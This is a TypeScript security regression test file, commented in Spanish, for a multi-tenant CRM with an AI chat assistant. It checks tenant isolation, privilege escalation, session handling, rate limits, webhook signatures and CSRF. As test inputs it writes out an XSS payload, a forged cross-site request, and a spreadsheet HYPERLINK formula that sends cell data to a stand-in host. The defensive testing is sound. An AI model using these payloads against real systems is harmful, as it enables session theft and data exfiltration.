// Pruebas de seguridad (sin modelo): pnpm test:seguridad
//
// Esto no mide si el asistente contesta bonito: mide que **nadie vea lo que no es suyo**. En un CRM que atiende
// a varios negocios a la vez, la falla cara no es un error en pantalla, es que el agente de una boutique alcance
// las conversaciones de una financiera, o que un desconocido llegue al tablero sin token.
//
// Las peticiones se hacen contra la aplicación de verdad (`app.request`, el mismo camino que un navegador), no
// contra las funciones por dentro: lo que se quiere probar es el guardia, y el guardia vive en el middleware.
//
// 🪤 Todo pasa en una carpeta temporal con clientes inventados (AIVA_CLIENTES_DIR). Ni una línea de esto toca el
// archivo de usuarios ni los clientes de verdad.
import { mkdirSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const dir = mkdtempSync(join(tmpdir(), 'aiva-seguridad-'));
const clientesDir = join(dir, 'clientes');
mkdirSync(clientesDir, { recursive: true });
process.env.AIVA_CLIENTES_DIR = clientesDir;
process.env.DB_PATH = join(dir, 'aiva.db');
process.env.CONSOLA_TOKEN = 'llave-maestra-de-prueba-0123456789';
process.env.ADMIN_TOKEN = 'token-del-tablero-de-prueba-0123456789';

// Dos negocios que no tienen nada que ver entre sí. Los puertos no existen: lo que se prueba aquí es quién
// puede llegar, no qué contesta el de allá.
writeFileSync(
  join(clientesDir, 'index.json'),
  JSON.stringify({
    clientes: [
      { slug: 'boutique', nombre: 'Boutique de prueba', puerto: 39901, host: '', prioridad: 'alta', desde: '2026-01-01' },
      { slug: 'financiera', nombre: 'Financiera de prueba', puerto: 39902, host: '', prioridad: 'alta', desde: '2026-01-01' },
    ],
  }),
);

const { Hono } = await import('hono');
const { mountConsola } = await import('../consola.js');
const { mountAdmin } = await import('../channels/admin.js');
const { crearUsuario, actualizarUsuario, leerUsuarios } = await import('../consola-usuarios.js');

let fail = 0;
const check = (name: string, ok: boolean, detail = '') => {
  if (!ok) fail++;
  console.log(`${ok ? '✓' : '✗'} ${name}${ok ? '' : `\n   ${detail}`}`);
};

const consola = new Hono();
mountConsola(consola);
const tablero = new Hono();
// eslint-disable-next-line @typescript-eslint/no-explicit-any
mountAdmin(tablero as any);

// Quien atiende a la boutique y nada más. Y un super-admin, para comparar.
crearUsuario({ usuario: 'agente', nombre: 'Agente de la boutique', clave: 'clave-de-prueba-1', rol: 'agente', clientes: ['boutique'] });
crearUsuario({ usuario: 'jefa', nombre: 'La jefa', clave: 'clave-de-prueba-2', rol: 'super', clientes: [] });

const entrar = async (usuario: string, clave: string) => {
  const r = await consola.request('/api/entrar', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ usuario, clave }),
  });
  return { status: r.status, cuerpo: (await r.json()) as { sesion?: string; error?: string }, galleta: r.headers.get('set-cookie') ?? '' };
};
const conSesion = (sesion: string) => ({ 'x-consola-sesion': sesion });
const pedir = (ruta: string, headers: Record<string, string> = {}, opts: RequestInit = {}) => consola.request(ruta, { ...opts, headers });

// ---------- Entrar ----------
const malo = await entrar('agente', 'la-que-no-es');
check('una clave equivocada no entra', malo.status === 401 && !malo.cuerpo.sesion, JSON.stringify(malo.cuerpo));
const noExiste = await entrar('nadie', 'lo-que-sea');
check('un usuario que no existe tampoco', noExiste.status === 401 && !noExiste.cuerpo.sesion);
check('y el mensaje no delata si el usuario existe o no', malo.cuerpo.error === noExiste.cuerpo.error, `${malo.cuerpo.error} / ${noExiste.cuerpo.error}`);

const suyo = await entrar('agente', 'clave-de-prueba-1');
check('con la clave buena, entra', suyo.status === 200 && Boolean(suyo.cuerpo.sesion));
const sesion = suyo.cuerpo.sesion!;

// 🪤 La galleta de sesión no puede leerse desde JavaScript ni viajar a otro sitio.
check('la galleta de sesión es HttpOnly', /HttpOnly/i.test(suyo.galleta), suyo.galleta);
check('y no se manda en peticiones que vengan de otro sitio (SameSite)', /SameSite=(Lax|Strict)/i.test(suyo.galleta), suyo.galleta);

// ---------- Nadie sin sesión ----------
for (const ruta of ['/api/clientes', '/api/usuarios', '/api/pendientes', '/api/series', '/api/yo']) {
  const r = await pedir(ruta);
  check(`sin sesión, ${ruta} no contesta`, r.status === 401, `dio ${r.status}`);
}
const inventada = await pedir('/api/clientes', conSesion('esta-sesion-me-la-invente'));
check('una sesión inventada no vale', inventada.status === 401, `dio ${inventada.status}`);

const laJefa = await entrar('jefa', 'clave-de-prueba-2');
const sesionSuper = laJefa.cuerpo.sesion!;

// ---------- 🪤 Un cliente no puede ver a otro ----------
const mis = (await (await pedir('/api/clientes', conSesion(sesion))).json()) as { clientes: { cliente: { slug: string } }[] };
check('quien atiende a un solo negocio solo ve ese negocio', mis.clientes.length === 1 && mis.clientes[0]!.cliente.slug === 'boutique',
  JSON.stringify(mis.clientes.map((x) => x.cliente.slug)));

const ajeno = await pedir('/c/financiera/contacts', conSesion(sesion));
check('🪤 y no alcanza el tablero del otro negocio', ajeno.status === 403, `dio ${ajeno.status}`);
const marcaAjena = await pedir('/api/marca/financiera', conSesion(sesion));
check('🪤 ni el logo del otro negocio', marcaAjena.status === 403, `dio ${marcaAjena.status}`);
const tokenAjeno = await pedir('/api/clientes/financiera/token', conSesion(sesion));
check('🪤 ni el token de administración del otro negocio', tokenAjeno.status === 403, `dio ${tokenAjeno.status}`);
const propio = await pedir('/c/boutique/contacts', conSesion(sesion));
check('pero el suyo sí lo alcanza (no contesta porque no hay nadie detrás, pero no lo frena el permiso)', propio.status !== 403, `dio ${propio.status}`);

// ---------- 🪤 Un agente no se asciende solo ----------
const soloSuper: [string, string, RequestInit][] = [
  ['/api/usuarios', 'ver el equipo', { method: 'GET' }],
  ['/api/usuarios', 'crear usuarios', { method: 'POST', body: JSON.stringify({ usuario: 'colado', clave: 'clave-colada-1', rol: 'super' }) }],
  ['/api/usuarios/jefa', 'cambiarle la clave a otro', { method: 'PATCH', body: JSON.stringify({ clave: 'me-la-cambio-yo' }) }],
  ['/api/usuarios/jefa', 'borrar a otro', { method: 'DELETE' }],
  ['/api/clientes', 'dar de alta un cliente', { method: 'POST', body: JSON.stringify({ nombre: 'Mío', slug: 'mio' }) }],
];
for (const [ruta, que, opts] of soloSuper) {
  const r = await pedir(ruta, { ...conSesion(sesion), 'content-type': 'application/json' }, opts);
  check(`🪤 un agente no puede ${que}`, r.status === 403, `dio ${r.status}`);
}
check('y el equipo quedó como estaba', leerUsuarios().length === 2 && !leerUsuarios().some((u) => u.usuario === 'colado'),
  leerUsuarios().map((u) => u.usuario).join(','));
check('su rol sigue siendo el que era', leerUsuarios().find((u) => u.usuario === 'agente')!.rol === 'agente');

// Cambiarse lo suyo sí puede; el rol y los clientes, no.
await pedir('/api/yo', { ...conSesion(sesion), 'content-type': 'application/json' }, { method: 'PATCH', body: JSON.stringify({ rol: 'super', clientes: ['financiera'], nombre: 'Me cambio el nombre' }) });
const yoDespues = leerUsuarios().find((u) => u.usuario === 'agente')!;
check('🪤 cambiándose «lo mío» tampoco se asciende', yoDespues.rol === 'agente' && !yoDespues.clientes.includes('financiera'),
  JSON.stringify({ rol: yoDespues.rol, clientes: yoDespues.clientes }));

// ---------- Las claves ----------
const guardado = JSON.parse(readFileSync(join(clientesDir, 'usuarios.json'), 'utf8')) as { usuarios: Record<string, unknown>[] };
const comoTexto = JSON.stringify(guardado);
check('🪤 la clave no queda guardada en claro', !comoTexto.includes('clave-de-prueba-1') && !comoTexto.includes('clave-de-prueba-2'), comoTexto.slice(0, 200));
const yo = (await (await pedir('/api/yo', conSesion(sesion))).json()) as Record<string, unknown>;
check('ni sale en lo que devuelve la API', !JSON.stringify(yo).includes('clave-de-prueba-1') && !/"clave"|"hash"|"salt"/.test(JSON.stringify(yo)), JSON.stringify(yo).slice(0, 200));

// ---------- La sesión se acaba cuando tiene que acabarse ----------
const otra = await entrar('agente', 'clave-de-prueba-1');
await pedir('/api/salir', conSesion(otra.cuerpo.sesion!), { method: 'POST' });
const despues = await pedir('/api/yo', conSesion(otra.cuerpo.sesion!));
check('al salir, esa sesión ya no vale', despues.status === 401, `dio ${despues.status}`);

const tercera = await entrar('agente', 'clave-de-prueba-1');
actualizarUsuario('agente', { activo: false });
const desactivado = await pedir('/api/yo', conSesion(tercera.cuerpo.sesion!));
check('🪤 desactivar a alguien le cierra la sesión que ya tenía', desactivado.status === 401, `dio ${desactivado.status}`);
actualizarUsuario('agente', { activo: true });

// 🪤 Cambiarle la clave a alguien tiene que echarlo. Si no, a una cuenta que se filtró se le cambia la clave
// y quien entró sigue adentro doce horas más, que es lo contrario de lo que uno cree que acaba de hacer.
const cuarta = await entrar('agente', 'clave-de-prueba-1');
check('la sesión vale mientras la clave sea la misma', (await pedir('/api/yo', conSesion(cuarta.cuerpo.sesion!))).status === 200);
actualizarUsuario('agente', { clave: 'otra-clave-distinta' });
const traslaClave = await pedir('/api/yo', conSesion(cuarta.cuerpo.sesion!));
check('🪤 cambiarle la clave a alguien cierra la sesión que tenía abierta', traslaClave.status === 401, `dio ${traslaClave.status}`);
check('y con la clave nueva se entra normal', (await entrar('agente', 'otra-clave-distinta')).status === 200);
actualizarUsuario('agente', { clave: 'clave-de-prueba-1' });

// ---------- El tablero de un cliente ----------
const sinToken = await tablero.request('/admin/api/contacts');
check('sin token, el tablero no contesta', sinToken.status === 401, `dio ${sinToken.status}`);
const conOtroToken = await tablero.request('/admin/api/contacts', { headers: { 'x-admin-token': 'token-equivocado' } });
check('con un token equivocado, tampoco', conOtroToken.status === 401, `dio ${conOtroToken.status}`);
const conElBueno = await tablero.request('/admin/api/contacts', { headers: { 'x-admin-token': process.env.ADMIN_TOKEN! } });
check('con el suyo, sí', conElBueno.status === 200, `dio ${conElBueno.status}`);

// Rutas del tablero que mueven datos: ninguna puede quedar fuera del guardia.
for (const [ruta, metodo] of [['/admin/api/config', 'PUT'], ['/admin/api/respaldo', 'POST'], ['/admin/api/importar', 'POST'], ['/admin/api/demo', 'POST'], ['/admin/api/reindexar', 'POST']] as [string, string][]) {
  const r = await tablero.request(ruta, { method: metodo, headers: { 'content-type': 'application/json' }, body: '{}' });
  check(`sin token, ${metodo} ${ruta} no hace nada`, r.status === 401, `dio ${r.status}`);
}

// ---------- El chat público: la puerta que sí está abierta a cualquiera ----------
// 🪤 Cada mensaje de aquí llama al modelo, y eso lo paga el cliente. Sin freno, cualquiera con un bucle le
// vacía el presupuesto en una tarde.
const { rateLimited, app: publico } = await import('../channels/web.js');
const llave = 'prueba-' + Date.now();
let bloqueado = -1;
for (let i = 1; i <= 25; i++) {
  if (rateLimited(llave, 20) && bloqueado < 0) bloqueado = i;
}
check('el chat público corta a quien escribe de más', bloqueado === 21, `cortó en el intento ${bloqueado}`);
check('y cada conversación lleva su propia cuenta', !rateLimited('otra-' + Date.now(), 20));

const vacio = await publico.request('/api/chat', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ message: '  ' }) });
check('un mensaje vacío no llega al modelo', vacio.status === 400, `dio ${vacio.status}`);
const enorme = await publico.request('/api/chat', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ message: 'a'.repeat(5000) }) });
check('ni uno enorme', enorme.status === 400, `dio ${enorme.status}`);

// Las conversaciones del chat del sitio se piden por su identificador. Que uno inventado no devuelva nada de
// nadie es lo que impide leer la conversación de un tercero.
const historialAjeno = await publico.request('/api/history?sessionId=' + encodeURIComponent('web:cualquiera'));
const cuerpoAjeno = (await historialAjeno.json()) as { messages: unknown[] };
check('un identificador inventado no devuelve conversación de nadie', cuerpoAjeno.messages.length === 0, JSON.stringify(cuerpoAjeno).slice(0, 120));
const streamMalo = await publico.request('/api/stream?sessionId=x');
check('ni se puede escuchar en vivo con uno inválido', streamMalo.status === 400, `dio ${streamMalo.status}`);

// ---------- 🪤 Lo que escribe un desconocido, en la pantalla de quien atiende ----------
// El tablero pinta nombres, mensajes y resúmenes que escribió cualquiera por WhatsApp. Si eso llegara al DOM sin
// escapar, un cliente cualquiera ejecutaría JavaScript en la sesión de quien atiende y se llevaría su token.
// Verificado a mano en un navegador (la carga sale como texto en la lista, el chat, la ficha y las notas); esto
// es el centinela de que la función de escape no se debilite sin que nadie se entere.
const CARGA = `<img src=x onerror="robar()">&'`;
const ESPERADO = '&lt;img src=x onerror=&quot;robar()&quot;&gt;&amp;&#39;';
for (const [archivo, patron] of [
  ['public/admin.js', /function esc\(s\)\s*\{[\s\S]*?\n  \}/],
  ['public/consola.html', /var esc = function \(s\)\s*\{.*?\};/],
] as [string, RegExp][]) {
  const fuente = readFileSync(archivo, 'utf8').match(patron)?.[0] ?? '';
  const escapar = fuente ? (new Function(`${fuente.startsWith('var') ? fuente : `var f = ${fuente.replace('function esc(s)', 'function (s)')};`} return typeof esc === 'function' ? esc : f;`) as () => (s: string) => string)() : null;
  check(`${archivo} escapa lo que viene de fuera`, Boolean(escapar) && escapar!(CARGA) === ESPERADO, escapar ? escapar(CARGA) : 'no encontré la función de escape');
}

// 🪤 El nombre de quien contestó tampoco es de fiar. En un chat de WhatsApp importado sale tal cual del
// archivo, así que lo escribe un desconocido. Esto se ejecutaba de verdad en el tablero: comprobado en un
// navegador, y arreglado. La prueba arma la burbuja igual que el tablero y mira que no nazca ninguna etiqueta.
const fuenteAdmin = readFileSync('public/admin.js', 'utf8');
const trozo = (re: RegExp) => fuenteAdmin.match(re)?.[0] ?? '';
const burbuja = (() => {
  const escSrc = trozo(/function esc\(s\)[\s\S]*?\n  \}/);
  const bubbleSrc = trozo(/function bubble\(msg\)[\s\S]*?\n  \}/);
  if (!escSrc || !bubbleSrc) return null;
  return new Function(`${escSrc}\nfunction hhmm(){return '00:00'}\n${bubbleSrc}\nreturn bubble;`)() as (m: Record<string, unknown>) => string;
})();
const pintado = burbuja?.({ role: 'assistant', author: 'human', by: '<img src=x onerror="robar()">', content: 'Ya te ayudo', ts: 0 }) ?? '';
check('🪤 el nombre de quien contestó no puede meter etiquetas en el tablero', Boolean(burbuja) && !/<img/i.test(pintado), pintado.slice(0, 180) || 'no pude armar la burbuja');
check('y lo que escribió el cliente, tampoco', !/<img/i.test(burbuja?.({ role: 'user', author: 'customer', content: '<img src=x onerror="robar()">', ts: 0 }) ?? '<img'), 'el contenido se coló');

// ---------- Las cabeceras que le quitan alcance a cualquier fallo ----------
for (const [nombre, r] of [
  ['la consola', await pedir('/', conSesion(sesion))],
  ['el tablero', await tablero.request('/admin')],
] as [string, Response][]) {
  check(`${nombre} dice que no se adivine el tipo de archivo`, r.headers.get('x-content-type-options') === 'nosniff', String(r.headers.get('x-content-type-options')));
  check(`${nombre} no se puede meter en un marco ajeno`, r.headers.get('x-frame-options') === 'DENY', String(r.headers.get('x-frame-options')));
  check(`${nombre} no filtra su dirección al salir`, r.headers.get('referrer-policy') === 'no-referrer', String(r.headers.get('referrer-policy')));
}

// ---------- 🪤 El webhook de WhatsApp: la puerta por la que entra lo que dice ser Meta ----------
// Sin el secreto de la app, esto aceptaba CUALQUIER cuerpo sin firma: se inventaban conversaciones en el CRM y,
// peor, se hacía que el número verificado del negocio le escribiera a un tercero.
const { validSignature } = await import('../channels/meta.js');
check('🪤 sin secreto configurado, no se acepta ningún webhook', validSignature('{"lo":"que sea"}', undefined) === false);
check('ni aunque traiga una firma inventada', validSignature('{"lo":"que sea"}', 'sha256=' + 'a'.repeat(64)) === false);

// ---------- 🪤 El CSV que abre el dueño del negocio ----------
// El nombre lo pone el cliente desde WhatsApp, y Excel ejecuta lo que empieza por = + - @.
const { contactsCsv } = await import('../crm/export.js');
const db = (await import('../rag/store.js')).getDb();
const { touchUser } = await import('../agent/memory.js');
touchUser('wa:573001234567@s.whatsapp.net', 'whatsapp', '=HYPERLINK("http://malo/?"&A1,"ver factura")');
const csv = contactsCsv();
touchUser('wa:573009998877@s.whatsapp.net', 'whatsapp', 'Cliente normal');
check('🪤 una fórmula en el nombre queda como texto en el CSV', csv.includes(`'=HYPERLINK`) && !/(^|;|\n)=HYPERLINK/.test(csv), csv.split('\n').find((l) => l.includes('HYPERLINK'))?.slice(0, 90) ?? 'no salió la fila');
// Y lo que NO se puede romper por el camino: un teléfono empieza por «+» y tiene que salir tal cual.
check('pero un teléfono sigue saliendo igual', /(^|;)\+57\d+/m.test(contactsCsv()), contactsCsv().split('\n').find((l) => l.includes('+57'))?.slice(0, 80) ?? 'no hay teléfonos');
void db;

// ---------- 🪤 Peticiones disparadas desde otra página ----------
// Con la galleta puesta, una página cualquiera podía hacer que el navegador de quien atiende creara un
// super-admin. Lo único que lo frenaba era que el navegador no mandara la galleta, y en un despliegue de un solo
// dominio el atacante puede estar en el mismo origen.
const deFuera = await consola.request('/api/usuarios', {
  method: 'POST',
  headers: { ...conSesion(sesionSuper), 'content-type': 'application/json', origin: 'https://sitio-del-atacante.example' },
  body: JSON.stringify({ usuario: 'colado-csrf', clave: 'clave-colada-1', rol: 'super' }),
});
check('🪤 una petición lanzada desde otra página no se ejecuta', deFuera.status === 403, `dio ${deFuera.status}`);
check('y no quedó ningún usuario colado', !leerUsuarios().some((u) => u.usuario === 'colado-csrf'), leerUsuarios().map((u) => u.usuario).join(','));
const deAqui = await consola.request('/api/usuarios', {
  method: 'POST',
  headers: { ...conSesion(sesionSuper), 'content-type': 'application/json', origin: 'http://localhost' },
  body: JSON.stringify({ usuario: 'uno-normal', clave: 'clave-normal-1', rol: 'agente', clientes: ['boutique'] }),
});
check('pero la de la propia consola sí', deAqui.status === 200, `dio ${deAqui.status}`);

// 🪤 Y detrás del servidor del hosting, aiva vive en un puerto interno: ve `127.0.0.1:3900` mientras el
// navegador dice `https://aiva.<dominio>`. Comparar contra la dirección interna dejó a todo el mundo fuera del
// login —pasó en producción—. Lo que vale es el nombre con el que llamaron.
const trasElProxy = await consola.request('/api/entrar', {
  method: 'POST',
  headers: { 'content-type': 'application/json', origin: 'https://aiva.ejemplo.co', host: 'aiva.ejemplo.co', 'x-forwarded-host': 'aiva.ejemplo.co' },
  body: JSON.stringify({ usuario: 'jefa', clave: 'clave-de-prueba-2' }),
});
check('🪤 entrar desde el dominio de verdad funciona aunque adentro el puerto sea otro', trasElProxy.status === 200, `dio ${trasElProxy.status}`);
const sinCabeceras = await consola.request('/api/entrar', {
  method: 'POST',
  headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ usuario: 'jefa', clave: 'clave-de-prueba-2' }),
});
check('y sin Origin (curl, una app) también', sinCabeceras.status === 200, `dio ${sinCabeceras.status}`);

// ---------- Con quién cree el cliente que está hablando ----------
// Por WhatsApp el cliente ve siempre el mismo número y contestan dos: el asistente y las personas del equipo.
// 🪤 Antes salía el NOMBRE de quien escribía desde el tablero —«*Arthur:*»—, que al cliente no le dice nada y
// de paso expone a quien atiende. Va el papel, no la persona.
const { conFirma } = await import('../crm/outbox.js');
const { business: negocio } = await import('../config.js');
check('lo que escribe una persona sale firmado como el equipo', conFirma('ya te ayudo', 'human', 'whatsapp') === `*${negocio.crm.firmaHumano}:* ya te ayudo`, conFirma('ya te ayudo', 'human', 'whatsapp'));
check('y lo del asistente, con su nombre', conFirma('claro que sí', 'bot', 'whatsapp') === `*${negocio.agent.name}:* claro que sí`, conFirma('claro que sí', 'bot', 'whatsapp'));
check('🪤 el nombre de quien atiende no sale nunca', !/Arthur|arthur/.test(conFirma('hola', 'human', 'whatsapp')));
check('en el chat del sitio no se firma: ahí ya se ve quién habla', conFirma('hola', 'human', 'web') === 'hola');

// ---------- 🪤 El operador es una persona, no el asistente ----------
// Esto salió tres veces como «el perfil se cruza entre clientes»: el tablero rellenaba el nombre de quien
// atiende con el del ASISTENTE cuando estaba vacío, y como todos los clientes llaman igual al suyo, el operador
// acababa llamándose «Aiva» en todos. La prueba mira el código: que no quede ningún camino que lo rellene solo.
const fuenteTablero = readFileSync('public/admin.js', 'utf8');
check('🪤 el nombre de quien atiende no se rellena con el del asistente', !/state\.name\s*=\s*me\.agent/.test(fuenteTablero) && !/state\.name\s*=.*state\.agentName/.test(fuenteTablero),
  (fuenteTablero.match(/state\.name\s*=.*/g) ?? []).join(' | ').slice(0, 200));
check('y al pintarlo tampoco se cae al del asistente', !/var nombre = state\.name \|\| state\.agentName/.test(fuenteTablero));
// 🪤 Y el nombre de la cuenta NO pisa lo que se haya puesto para un cliente concreto: cada negocio es un
// tenant aparte, y que el nombre del super-admin se propague a los tres tableros a la vez es justo lo que no
// debe pasar. Primero lo del cliente, y solo si no hay, el de la cuenta.
check('🪤 lo puesto para un cliente manda sobre el nombre de la cuenta',
  /state\.name = localStorage\.getItem\(LLAVE\('name'\)\) \|\|/.test(fuenteTablero),
  (fuenteTablero.match(/state\.name = localStorage[^;]*/) ?? ['no encontré la línea'])[0]);

// ---------- 🪤 Probar claves a ciegas ----------
// Va de ÚLTIMO a propósito: el freno deja bloqueado quince minutos a quien lo dispara, así que cualquier prueba
// que necesite entrar después de esto fallaría sin tener nada roto.
// tirar miles de intentos por minuto, la única defensa es la longitud de la clave. Tiene que frenar.
const intentos: number[] = [];
for (let i = 0; i < 40; i++) intentos.push((await entrar('agente', 'intento-' + i)).status);
check('🪤 probar claves a lo bruto se frena', intentos.includes(429), `40 intentos y ninguno frenado (${[...new Set(intentos)].join(', ')})`);
const maestras: number[] = [];
for (let i = 0; i < 40; i++) {
  const r = await consola.request('/api/entrar', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ maestra: 'adivinando-' + i }) });
  maestras.push(r.status);
}
check('🪤 y adivinar la llave maestra, también', maestras.includes(429), `40 intentos y ninguno frenado (${[...new Set(maestras)].join(', ')})`);


console.log(fail ? `\n${fail} fallos` : '\ntodo ok');
process.exit(fail ? 1 : 0);
